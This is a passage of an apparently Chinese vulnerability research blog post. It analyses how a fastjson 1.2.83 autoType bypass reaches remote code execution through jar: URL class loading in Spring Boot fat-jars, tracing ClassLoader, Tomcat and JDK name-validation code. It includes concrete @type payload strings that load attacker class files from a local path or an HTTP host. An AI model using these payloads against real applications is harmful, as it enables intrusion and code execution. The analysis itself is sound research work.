+<h2 id="三、从-getResourceAsStream-到-RCE：思路推导"><a href="#三、从-getResourceAsStream-到-RCE：思路推导" class="headerlink" title="三、从 getResourceAsStream 到 RCE：思路推导"></a>三、从 getResourceAsStream 到 RCE：思路推导</h2><p>第二章已经说明：<code>jsonType=true</code> 时 <code>checkAutoType</code> 会 <code>loadClass</code> 并短路返回，从而绕过黑名单等检查。真正要打成 RCE，还需要让 <code>getResourceAsStream</code> 返回攻击者可控、且带 <code>@JSONType</code> 的类字节码。下面按条件逐步收束。</p>
+<h3 id="3-1-资源路径完全可控"><a href="#3-1-资源路径完全可控" class="headerlink" title="3.1 资源路径完全可控"></a>3.1 资源路径完全可控</h3><p><code>com.alibaba.fastjson.parser.ParserConfig:1482-1486</code> 中，资源名由 <code>@type</code> 经 <code>typeName.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;</code> 得到，再交给 <code>getResourceAsStream</code>。在默认 <code>autoType</code> 关闭、未配置 <code>defaultClassLoader</code> 的常见场景下，路径字符串仍完全来自攻击者输入。</p>
+<p>这一点首先应理解为攻击者可控的资源读取点，而不是默认就能出网：多数 ClassLoader 只会在 classpath 内按资源名查找，并不会把该字符串当成 URL 去访问。能否变成远程加载，取决于后面的路径形态与运行时 ClassLoader。</p>
+<h3 id="3-2-必须控制返回内容（-JSONType）"><a href="#3-2-必须控制返回内容（-JSONType）" class="headerlink" title="3.2 必须控制返回内容（@JSONType）"></a>3.2 必须控制返回内容（@JSONType）</h3><p>仅有可控路径不够。旁路与加载都依赖 <code>jsonType=true</code>，而该标志来自对资源流字节码的 ASM 扫描（<code>com.alibaba.fastjson.parser.ParserConfig:1488-1492</code>）：</p>
+<ul>
+<li>返回的 class 带 <code>@JSONType</code> → <code>jsonType=true</code> → <code>TypeUtils.loadClass</code>（约 <code>:1500-1502</code>）→ 短路返回（约 <code>:1506-1510</code>）→ 类定义后，在首次主动使用时触发 <code>&lt;clinit&gt;</code>，可执行恶意逻辑</li>
+<li>未带 <code>@JSONType</code>（或资源根本读不到，<code>jsonType</code> 保持 false）→ 在 <code>autoType</code> 关闭时于约 <code>:1542</code> 抛出 <code>autoType is not support</code>，利用终止</li>
+</ul>
+<p>因此攻击者必须控制 <code>getResourceAsStream</code> 的返回内容。classpath 上既有的类字节码通常不可控（除非另有写入 classpath &#x2F; 依赖投毒等条件），现实路径是：指向攻击者可写的本地资源，或指向攻击者控制的远程资源。</p>
+<h3 id="3-3-用-jar-URL-承载外部资源"><a href="#3-3-用-jar-URL-承载外部资源" class="headerlink" title="3.3 用 jar: URL 承载外部资源"></a>3.3 用 jar: URL 承载外部资源</h3><p>在 2.3 的约束下，<code>@type</code> 全程用 <code>.</code> 作路径分隔，经 replace 后可拼出 <code>jar:</code> 形式的资源名。<code>jar:</code> 是统一载体：远程可用 <code>jar:http:</code>，本地落盘可用 <code>jar:file:</code>，下面的利用链两者都会用到。</p>
+<p>远程示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@type 值:    jar:http:..2130706433:18081.probe!.POC</span><br><span class="line">replace 后:  jar:http://2130706433:18081/probe!/POC.class</span><br></pre></td></tr></table></figure>
+
+<p>这里 host 写成 <code>2130706433</code>（<code>127.0.0.1</code> 的整数形式）是必要的：<code>replace(&#39;.&#39;, &#39;/&#39;)</code> 会处理字符串中每一个 <code>.</code>。若写成 <code>127.0.0.1</code>，会变成 <code>127/0/0/1</code>，URL 直接被破坏。整数 IP 不含点号，才能在「分隔符必须用 <code>.</code>」的约束下保留合法 host。</p>
+<p>本地同理，例如 <code>jar:file:.tmp.probe!.POC</code> → <code>jar:file:/tmp/probe!/POC.class</code>（路径段同样用 <code>.</code> 书写，避免原文出现 <code>/</code>）。</p>
+<h3 id="3-4-只有特定-ClassLoader-会解析-jar-资源名"><a href="#3-4-只有特定-ClassLoader-会解析-jar-资源名" class="headerlink" title="3.4 只有特定 ClassLoader 会解析 jar: 资源名"></a>3.4 只有特定 ClassLoader 会解析 jar: 资源名</h3><p>即便资源名已是合法 <code>jar:http://...</code> &#x2F; <code>jar:file:...</code>，标准 JDK 的 <code>ClassLoader.getResourceAsStream</code> 也不会把它当 URL 打开——<code>AppClassLoader</code> &#x2F; 普通 <code>URLClassLoader</code> 只在 classpath 的 jar、目录里按名称查找。实测 <code>AppClassLoader.getResourceAsStream(&quot;jar:http://...&quot;)</code> 返回 null；<code>findResource</code> 不会对资源名发起 HTTP 请求。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505542_image-20260722025915159.png" alt="image-20260722025915159"></p>
+<p>Spring Boot fat-jar 的 <code>LaunchedURLClassLoader</code> 是常见例外。 启动阶段会通过 <code>JarFile.registerUrlProtocolHandler()</code> 注册自定义 <code>jar:</code> 协议处理，使该类加载器能够处理 <code>jar:http://</code>、<code>jar:file:</code> 形式的资源路径（具体加载与 <code>defineClass</code> 路径见第四章）。</p>
+<p>于是利用面从「任意接入 fastjson 的 Java 应用」收束为：运行时 ClassLoader 具备 <code>jar:</code> 资源名解析能力的环境；其中 <code>java -jar</code> 启动的 Spring Boot fat-jar 是最高频场景。下一章沿这条 ClassLoader 链把探测、加载与类定义补全。</p>
+<hr>
+<h2 id="四、ClassLoader-链路分析"><a href="#四、ClassLoader-链路分析" class="headerlink" title="四、ClassLoader 链路分析"></a>四、ClassLoader 链路分析</h2><p>利用能否走通，取决于运行时 ClassLoader 如何处理 <code>jar:</code> 形态的资源名，以及 <code>loadClass</code> 如何定义类。下面以 <code>java -jar</code> 启动的 Spring Boot 2.7.18（内嵌 Tomcat）为例。</p>
+<h3 id="4-1-资源探测与类加载用的不是同一条入口"><a href="#4-1-资源探测与类加载用的不是同一条入口" class="headerlink" title="4.1 资源探测与类加载用的不是同一条入口"></a>4.1 资源探测与类加载用的不是同一条入口</h3><p><code>checkAutoType</code> 里与 ClassLoader 相关的动作有两次，实参与入口都不同（见 2.3）：</p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>源码位置</th>
+<th>使用的 ClassLoader（<code>defaultClassLoader == null</code> 时）</th>
+<th>输入</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>资源探测</td>
+<td><code>ParserConfig:1484-1486</code></td>
+<td><code>ParserConfig.class.getClassLoader()</code></td>
+<td>replace 后的 resource（可含 <code>/</code>）</td>
+</tr>
+<tr>
+<td>类加载</td>
+<td><code>ParserConfig:1500-1502</code> → <code>TypeUtils.loadClass</code></td>
+<td>默认走 TCCL（见 4.3）</td>
+<td>原始 <code>typeName</code>（不得含 <code>/</code>）</td>
+</tr>
+</tbody></table>
+<p>fastjson 一般在 <code>BOOT-INF/lib</code> 中，由 <code>LaunchedURLClassLoader</code> 加载，探测侧默认就是该 CL。加载侧先到请求线程 TCCL，再经 parent delegation 回到同一棵应用 CL 树。两侧都可能落到同一个 <code>LaunchedURLClassLoader</code> 实例，但并不是同一个私有方法同时完成探测和 <code>defineClass</code>。</p>
+<h3 id="4-2-fat-jar-下的-ClassLoader-层级"><a href="#4-2-fat-jar-下的-ClassLoader-层级" class="headerlink" title="4.2 fat-jar 下的 ClassLoader 层级"></a>4.2 fat-jar 下的 ClassLoader 层级</h3><p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505543_image-20260722121049808.png" alt="image-20260722121049808"></p>
+<ul>
+<li><code>ParserConfig</code> 等应用类：通常在 <code>LaunchedURLClassLoader</code></li>
+<li>请求线程 TCCL：通常是 <code>TomcatEmbeddedWebappClassLoader</code>，parent 为上述 Launched 实例</li>
+<li>探测走「加载 fastjson 的 CL」，加载走「TCCL → parent」；<code>jar:file:</code> 形式纯默认即可，<code>jar:http:</code> 形式需 <code>setDefaultClassLoader</code>（见 5.3）</li>
+</ul>
+<h3 id="4-3-TypeUtils-loadClass-的三分支"><a href="#4-3-TypeUtils-loadClass-的三分支" class="headerlink" title="4.3 TypeUtils.loadClass 的三分支"></a>4.3 TypeUtils.loadClass 的三分支</h3><p>源码位置：<code>com.alibaba.fastjson.util.TypeUtils.loadClass(String, ClassLoader, boolean)</code>，约 <code>TypeUtils:1735</code>。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505546_image-20260722121752126.png" alt="image-20260722121752126"></p>
+<p><code>defaultClassLoader == null</code> 时顺序为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分支1：classLoader.loadClass(...)     // defaultClassLoader 非空时走这里（已 setDefaultClassLoader，直接用应用 CL）</span><br><span class="line">分支2：TCCL.loadClass(...)            // defaultClassLoader 为 null 时走这里（即纯默认，经 Tomcat）</span><br><span class="line">分支3：Class.forName(className)       // 兜底，实际上不可达</span><br></pre></td></tr></table></figure>
+
+<p><code>defaultClassLoader</code> 是否为空决定走哪条分支：</p>
+<ul>
+<li><code>setDefaultClassLoader</code> 手动指定了 ClassLoader（<code>defaultClassLoader</code> 非空），进入分支 1，直接 <code>defaultClassLoader.loadClass</code>；</li>
+<li>纯默认（<code>null</code>）进入分支 2 经 TCCL&#x3D;Tomcat。这条区别决定了 <code>jar:http:</code> 形式能否成功（详见 5.3）。</li>
+</ul>
+<p><code>className.length() &gt; 198</code> 会直接抛 <code>illegal className</code>（约 <code>:1740</code>）。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505550_image-20260722121813928.png" alt="image-20260722121813928"></p>
+<p>重点：请求线程上分支 2（<code>defaultClassLoader=null</code>、纯默认）实际要经过 Tomcat 的 <code>Class.forName</code>，这一步是 file&#x2F;http 的分水岭：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TypeUtils.loadClass 分支2 → TCCL.loadClass(typeName)</span><br><span class="line">  → TomcatEmbeddedWebappClassLoader.loadClass → doLoadClass</span><br><span class="line">      ├─ findClassIgnoringNotFound（本地 WebResourceRoot，查不到 jar: 资源）</span><br><span class="line">      └─ loadFromParent = Class.forName(typeName, false, LaunchedURLClassLoader)</span><br><span class="line">            ↑ native 校验 check_format.c:157 禁连续 `/`</span><br><span class="line">              jar:http://（双斜杠）在此被拒 → CNFE，到不了下一步</span><br><span class="line">              jar:file:/（单斜杠）通过 → 继续</span><br><span class="line">                → LaunchedURLClassLoader.loadClass → URLClassLoader.findClass → defineClass</span><br></pre></td></tr></table></figure>
+
+<p>http 在 <code>loadFromParent</code> 的 <code>Class.forName</code> 就失败、到不了 <code>LaunchedURLClassLoader.loadClass</code>；而 file 通过后可以继续走到 <code>defineClass</code>。详见 5.3 分析。</p>
+<p>spring-boot-loader 2.7.18 里，<code>LaunchedURLClassLoader.loadClass</code> 只有类名以 <code>org.springframework.boot.loader.jarmode.</code> 开头时才会进入私有方法 <code>loadClassInLaunchedClassLoader</code>；该方法调用的是 <code>getParent().getResourceAsStream</code>，与 <code>@type</code> 为 <code>jar:http:…</code> &#x2F; <code>jar:file:…</code> 的 payload 无关。</p>
+<p>payload 类名（<code>jar:http:…</code>&#x2F;<code>jar:file:…</code>）不是 <code>jarmode.</code> 前缀，因此走 <code>super.loadClass</code>（标准 <code>URLClassLoader</code> 的 <code>findClass</code> → ucp → <code>defineClass</code>），而非这个私有分支；能否加载成功取决于字节码 internal name 是否匹配、<code>checkName</code> 是否放行、JVM class-name 校验是否通过（见 5.3）。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505552_image-20260722123201966.png" alt="image-20260722123201966"></p>
+<h3 id="4-4-jar-Handler-与资源名解析"><a href="#4-4-jar-Handler-与资源名解析" class="headerlink" title="4.4 jar: Handler 与资源名解析"></a>4.4 <code>jar:</code> Handler 与资源名解析</h3><p>启动时 <code>JarFile.registerUrlProtocolHandler()</code> 会注册自定义 <code>jar:</code> <code>URLStreamHandler</code>，影响的是 <code>java.net.URL</code> &#x2F; <code>URLConnection</code> 如何打开 <code>jar:</code> 地址（含 fat-jar 嵌套路径）。</p>
+<table>
+<thead>
+<tr>
+<th>机制</th>
+<th>实际做什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>注册 <code>jar:</code> Handler</td>
+<td><code>new URL(&quot;jar:…&quot;)</code> 等如何建立连接</td>
+</tr>
+<tr>
+<td><code>ClassLoader.getResourceAsStream(name)</code></td>
+<td>多数实现按 classpath 内资源名查找，不会把任意字符串自动当成绝对 URL</td>
+</tr>
+<tr>
+<td>CL 扩展资源查找</td>
+<td>将 <code>jar:http:</code> &#x2F; <code>jar:file:</code> 形态的 name 解析为远端或本地 jar 条目（利用前提，见 3.4）</td>
+</tr>
+</tbody></table>
+<p>能否解析 <code>jar:</code> 资源名，取决于 ClassLoader 是否重写了资源查找。<code>AppClassLoader</code>（普通 <code>URLClassLoader</code>）即便注册了 jar Handler，<code>getResourceAsStream(&quot;jar:http://…&quot;)</code> 仍返回 null——它只在 classpath 内按资源名查找，不把 name 当 URL 解析（3.4 实测）；</p>
+<p><code>LaunchedURLClassLoader</code> 重写了 <code>findResource</code>，能把 <code>jar:http:</code>&#x2F;<code>jar:file:</code> 资源名解析为远端或本地 jar 条目并返回字节（5.3 实测两者都返回完整字节）。所以探测能否成功，要看实际被调用的 ClassLoader 是否具备这种扩展查找能力。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505556_image-20260722124746600.png" alt="image-20260722124746600"></p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505558_image-20260722201736258.png" alt="image-20260722201736258"></p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505560_image-20260722201739150.png" alt="image-20260722201739150"></p>
+<hr>
+<h2 id="五、默认配置下的可达性"><a href="#五、默认配置下的可达性" class="headerlink" title="五、默认配置下的可达性"></a>五、默认配置下的可达性</h2><h3 id="5-1-defaultClassLoader-null-的正确路径"><a href="#5-1-defaultClassLoader-null-的正确路径" class="headerlink" title="5.1 defaultClassLoader &#x3D; null 的正确路径"></a>5.1 defaultClassLoader &#x3D; null 的正确路径</h3><p>当 <code>defaultClassLoader=null</code> 时：</p>
+<ul>
+<li>资源探测使用 <code>ParserConfig.class.getClassLoader()</code>（约 <code>:1486</code>），在 Spring Boot fat-jar 中通常为加载 <code>BOOT-INF/lib</code> 的 <code>LaunchedURLClassLoader</code>；</li>
+<li>类加载走 <code>TypeUtils.loadClass(name, null, true)</code> 分支 2：请求线程 TCCL（常见为 <code>TomcatEmbeddedWebappClassLoader</code>）→ parent delegation → 同一 <code>LaunchedURLClassLoader</code>。</li>
+</ul>
+<p>探测与加载落在同一应用 CL 树上——对 <code>jar:file:</code> 形式，确实不需要业务侧手动 <code>setDefaultClassLoader</code>（纯默认即可加载）。但 <code>jar:http:</code> 形式在纯默认下会被 Tomcat 的 <code>Class.forName</code> 拦下，必须 <code>setDefaultClassLoader</code> 走分支 1，详见 5.3。 能否解析 <code>jar:</code> 资源名，仍取决于该 CL 的具体实现（第四章）。</p>
+<h3 id="5-2-payload-格式要求"><a href="#5-2-payload-格式要求" class="headerlink" title="5.2 payload 格式要求"></a>5.2 payload 格式要求</h3><p><code>@type</code> 值里路径分隔符必须用 <code>.</code>，不能写 <code>/</code>：fastjson 用 <code>.replace(&#39;.&#39;, &#39;/&#39;)</code> 把 <code>.</code> 还原为 <code>/</code> 拼资源路径，而 binary name（交给 <code>loadClass</code> 的原文）若含 <code>/</code>，会被 <code>ClassLoader.checkName()</code> 拒绝。</p>
+<table>
+<thead>
+<tr>
+<th><code>@type</code> 写法</th>
+<th>binary name（loadClass）</th>
+<th>replace 后（getResourceAsStream）</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>jar:file:.tmp.probe!.POC</code></td>
+<td>无 <code>/</code>，过 <code>checkName</code></td>
+<td><code>jar:file:/tmp/probe!/POC.class</code></td>
+<td>两侧通过</td>
+</tr>
+<tr>
+<td><code>jar:file:/tmp/probe!.POC</code></td>
+<td>含 <code>/</code>，<code>checkName</code> 拒</td>
+<td>同上</td>
+<td>类加载失败</td>
+</tr>
+</tbody></table>
+<p>同一规则还约束本地 jar 的文件名与 host：文件名不能含 <code>.</code>（如 <code>evil.jar</code>，<code>replace</code> 会拆成 <code>evil/jar</code>），需用无点文件名（如 <code>eviljar</code>）；host 必须用整数 IP（<code>2130706433</code>）而非点分形式。</p>
+<h3 id="5-3-重点：file-与-http-的根本差异"><a href="#5-3-重点：file-与-http-的根本差异" class="headerlink" title="5.3 重点：file 与 http 的根本差异"></a>5.3 重点：file 与 http 的根本差异</h3><p>5.1 的结论对 <code>jar:file:</code> 成立，但对 <code>jar:http:</code> 不成立，纯默认下 file 能加载，http 必须 <code>setDefaultClassLoader</code> 才行。这一点很反直觉：两者都是 <code>jar:</code> URL、<code>LaunchedURLClassLoader</code> 对它们的资源探测都能成功，下面通过实测和 JDK 源码分析一下。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505564_image-20260722130829583.png" alt="image-20260722130829583"></p>
+<p>实测环境：macOS &#x2F; JDK 1.8.0_431 &#x2F; Spring Boot 2.7.18 fat-jar &#x2F; fastjson 1.2.83。</p>
+<p>对同一个 name，分别用「分支1：<code>LaunchedURLClassLoader.loadClass</code>（对应已 <code>setDefaultClassLoader</code>）」和「分支2：<code>TCCL(Tomcat).loadClass</code>（对应未设置）」去加载，只看能否加载（OK &#x2F; <code>ClassNotFoundException</code>），不初始化、不触发 <code>&lt;clinit&gt;</code>：</p>
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th>分支1（已设，<code>LaunchedURLClassLoader.loadClass</code>）</th>
+<th>分支2（未设，<code>TCCL.loadClass</code>）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>jar:file:.tmp.eviljar!.POC</code></td>
+<td>OK</td>
+<td>OK</td>
+</tr>
+<tr>
+<td><code>jar:http:..2130706433:18080.probe!.POC</code></td>
+<td>OK</td>
+<td>FAIL <code>ClassNotFoundException: jar:http://2130706433:18080/probe!/POC</code></td>
+</tr>
+</tbody></table>
+<p><code>LaunchedURLClassLoader.loadClass</code> 对 file&#x2F;http 都能加载；<code>Tomcat.loadClass</code> 对 file 能加载、对 http 抛 CNFE（message 是 internal 形式 <code>jar:http://…</code>）。是否设置 <code>defaultClassLoader</code> 决定走分支1 还是分支2，也就决定了 http 形式能否加载——这正是后面要分析的起点。</p>
+<p>差异不在资源探测，在类加载。 资源探测（<code>checkAutoType</code> 的 <code>getResourceAsStream</code>，约 <code>:1486</code>）对 file 和 http 都成功：<code>LaunchedURLClassLoader</code> 重写了 <code>findResource</code>，<code>jar:</code> Handler 两种形式都解析，都读到字节、<code>jsonType=true</code>。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505566_image-20260722131350061.png" alt="image-20260722131350061"></p>
+<p>差异发生在 <code>TypeUtils.loadClass</code>（约 <code>:1500</code>）：<code>defaultClassLoader</code> 非空时走分支 1 <code>classLoader.loadClass(name)</code> 直接调 <code>LaunchedURLClassLoader</code>；为空时走分支 2 <code>contextClassLoader.loadClass(name)</code>（TCCL）→ <code>TomcatEmbeddedWebappClassLoader</code> → 委托回 <code>LaunchedURLClassLoader</code>。</p>
+<p>自定义一个 <code>/loadclass</code> 端点，<code>TCCL.getParent().loadClass(name)</code>，分别传 file 和 http 形式的 name。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505567_image-20260722131702060.png" alt="image-20260722131702060"></p>
+<p>绕过 Tomcat 后 file&#x2F;http 都通，说明 <code>LaunchedURLClassLoader</code> 本身不分 file&#x2F;http。差异在 <code>defaultClassLoader=null</code> 时必经的 Tomcat <code>WebappClassLoader</code> 这一层。</p>
+<p>Tomcat 的分叉点在 <code>loadFromParent</code>。 拆 <code>TomcatEmbeddedWebappClassLoader.doLoadClass</code> 的两个私有子步骤：<code>findClassIgnoringNotFound</code> 对 file&#x2F;http 都返回 null（一致），<code>loadFromParent</code> 对 file 返回 class、对 http 返回 null。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505570_image-20260722132402403.png" alt="image-20260722132402403"></p>
+<p><code>loadFromParent</code> 的源码：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505574_image-20260722132851016.png" alt="image-20260722132851016"></p>
+<p>其中 <code>parent = LaunchedURLClassLoader</code></p>
+<p>而 fastjson 在 <code>defaultClassLoader</code> 非空时走的分支 1 用的是 <code>classLoader.loadClass(name)</code>。<code>Class.forName</code> 与 <code>ClassLoader.loadClass</code> 对这个畸形 name 行为不同——这是全部分界。</p>
+<p>同一个 CL、同一个 name，结果相反。 实测对 http name 分别调两个 API：</p>
+<p>自定义一个 <code>/cmp</code> 端点对 http name 分别测 <code>parent.loadClass</code> 与 <code>Class.forName(_, false, parent)</code> 的输出。<br><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505579_image-20260722154216730.png" alt="image-20260722154216730"></p>
+<p>三个铁证：CNFE 的 message 是 internal 形式（<code>/</code>），不是传入的 binary（<code>.</code>），说明 native 层转换过 name；栈里只有 <code>forName0 (Native Method)</code>，没有 <code>loadClass</code>&#x2F;<code>findClass</code>&#x2F;<code>defineClass</code> 的 Java 帧，说明 native 在调 <code>loadClass</code> 之前就否了；file name 两个 API 都 OK。</p>
+<p>C++ 源码根因：<code>forName0</code> 的 native 校验禁止连续斜杠。 <code>Class.forName0</code> 的 native 实现在 OpenJDK 8u 的 <code>jdk/src/share/native/java/lang/Class.c</code>：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505585_image-20260722154624193.png" alt="image-20260722154624193"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class.c:123</span></span><br><span class="line"><span class="keyword">if</span> (VerifyFixClassname(clname) == JNI_TRUE) &#123; ... &#125;   <span class="comment">// 把 binary 的 &#x27;.&#x27; 原地改成 &#x27;/&#x27;</span></span><br><span class="line"><span class="comment">// Class.c:130</span></span><br><span class="line"><span class="keyword">if</span> (!VerifyClassname(clname, JNI_TRUE)) &#123;             <span class="comment">// expects slashed name</span></span><br><span class="line">    JNU_ThrowClassNotFoundException(env, clname);      <span class="comment">// :131 CNFE 直接在这里抛</span></span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">cls = JVM_FindClassFromCaller(env, clname, ...);       <span class="comment">// 通过校验才进 SystemDictionary</span></span><br></pre></td></tr></table></figure>
+
+<p>CNFE 在 <code>:131</code> 抛出，所以栈只有 <code>forName0 (Native Method)</code>、没有 Java <code>loadClass</code> 帧。<code>VerifyFixClassname</code> 把 <code>.</code> 改成 <code>/</code>（<code>*p++=&#39;/&#39;</code>）是原地修改，所以 <code>:131</code> 抛异常时 message 已经是 internal 形式。</p>
+<p><code>VerifyClassname</code>（<code>jdk/src/share/native/common/check_format.c:233</code>）调 <code>skip_over_fieldname</code>：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505588_image-20260722154938290.png" alt="image-20260722154938290"></p>
+<p><code>skip_over_fieldname</code>（<code>check_format.c:128</code>）逐字符走 name，用循环末尾的 <code>last_ch = ch</code> 记住上一个字符，第 157 行明确禁止连续斜杠：</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505591_image-20260722155031639.png" alt="image-20260722155031639"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check_format.c:155-157</span></span><br><span class="line"><span class="keyword">if</span> (slash_okay &amp;&amp; ch == <span class="string">&#x27;/&#x27;</span> &amp;&amp; last_ch) &#123;</span><br><span class="line">    <span class="keyword">if</span> (last_ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;       <span class="comment">/* Don&#x27;t permit consecutive slashes */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>http://</code> 的双斜杠：第一个 <code>/</code> 时 <code>last_ch</code> 是它前面的字符（<code>:</code>，不是 <code>/</code>），不 return，<code>last_ch</code> 更新为 <code>/</code>；第二个 <code>/</code> 时 <code>last_ch</code> 已经是 <code>/</code>，命中 <code>:157 return 0</code> → <code>VerifyClassname</code> 返回 false → <code>forName0:131</code> 抛 CNFE。</p>
+<p>辅助：<code>isJvmIdentifier</code>（<code>:56</code>）—— <code>:</code>、<code>!</code>、字母数字都是合法标识符（<code>continue</code> 跳过），只有 <code>/</code> <code>.</code> <code>[</code> <code>;</code> 进入上面的分支。所以 <code>http://</code> 里只有那两个 <code>/</code> 会走到 <code>:157</code>。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505594_image-20260722155112892.png" alt="image-20260722155112892"></p>
+<p>对照：<code>loadClass</code>&#x2F;<code>defineClass</code> 为什么放行 http。 <code>ClassLoader.loadClass</code> → <code>findClass</code> → <code>defineClass</code> 走的是另一条校验链：<code>ClassFileParser::verify_legal_class_name</code> → <code>verify_unqualified_name</code>（<code>hotspot/src/share/vm/classfile/classFileParser.cpp:5201</code>）。</p>
+<p><img src="/blog/img/friend_404.gif" data-lazy-src="/blog/image/HAMT_1784723505596_image-20260722155622955.png" alt="image-20260722155622955"></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// classFileParser.cpp:5209-5214</span></span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">&#x27;.&#x27;</span> || ch == <span class="string">&#x27;;&#x27;</span> || ch == <span class="string">&#x27;[&#x27;</span> ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (type != LegalClass &amp;&amp; ch == <span class="string">&#x27;/&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">// 只有非 LegalClass 才拒 /；LegalClass 放行所有 /（含连续）</span></span><br></pre></td></tr></table></figure>
+
+<p><code>LegalClass</code> 类型允许连续 <code>/</code>。所以 <code>defineClass</code> 对 <code>jar:http://...</code>（含空段）照样定义成功——这就是 <code>loadClass(http)</code> OK、Tomcat <code>loadFromParent</code>（用 <code>Class.forName</code>）挡 http 的根本原因。</p>
+<p>到这里我们知道了： 根因是 JDK 两套 class-name 校验严格度不同——<code>Class.forName0</code>（<code>check_format.c:157</code>）禁止连续斜杠，<code>defineClass</code>（<code>classFileParser.cpp:5212</code>）对 <code>LegalClass</code> 放行。<code>http://</code> 的双斜杠（URL authority 分隔符）正好命中前者。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>file</th>
+<th>http</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>资源探测 <code>:1486</code></td>
+<td>OK</td>
+<td>OK</td>
+</tr>
+<tr>
+<td>已 <code>setDefaultClassLoader</code>（分支 1 <code>loadClass</code> → <code>defineClass</code>，允许连续 <code>/</code>）</td>
+<td>OK</td>
+<td>OK</td>
+</tr>
+<tr>
+<td>未设置（分支 2 → Tomcat → <code>loadFromParent</code> → <code>Class.forName</code>，禁连续 <code>/</code>）</td>
+<td>OK</td>
+<td>失败（<code>forName0</code> <code>:157</code> 拒）</td>
+</tr>
+</tbody></table>
+<p>file 的 <code>file:/</code> 是单斜杠，过 <code>Class.forName</code> 的 <code>skip_over_fieldname</code>，所以纯默认（<code>defaultClassLoader=null</code>）即可加载；http 的 <code>http://</code> 是双斜杠，命中 <code>:157</code>，<code>Class.forName</code> 直接拒，必须 <code>setDefaultClassLoader</code> 让 <code>loadClass</code> 走分支 1 用 <code>ClassLoader.loadClass</code>（走 <code>defineClass</code> 那条允许连续 <code>/</code> 的校验链），绕过 Tomcat 的 <code>Class.forName</code>。</p>
+<p>需要强调的是：<code>setDefaultClassLoader</code> 是应用侧配置，攻击者无法控制；真实默认应用不会主动设置它。因此 <code>jar:http:</code> 单阶段在默认配置下<strong>不可达</strong>，默认配置下可达的是 <code>jar:file:</code>。</p>
+<hr>
+<h2 id="六、利用链"><a href="#六、利用链" class="headerlink" title="六、利用链"></a>六、利用链</h2><p>第五章已经确认：默认配置下 <code>jar:file:</code> 即可加载，<code>jar:http:</code> 单阶段不可达（需攻击者控不了的 <code>setDefaultClassLoader</code>）。下面先看最直接的本地 jar 单阶段利用链。</p>
+<h3 id="6-1-单阶段本地-jar-利用"><a href="#6-1-单阶段本地-jar-利用" class="headerlink" title="6.1 单阶段本地 jar 利用"></a>6.1 单阶段本地 jar 利用</h3><p>前提条件：目标机器上存在一个包含恶意 class 的 jar 文件（通过文件上传、其他漏洞写入、或共享目录），但是要注意不能带后缀。</p>
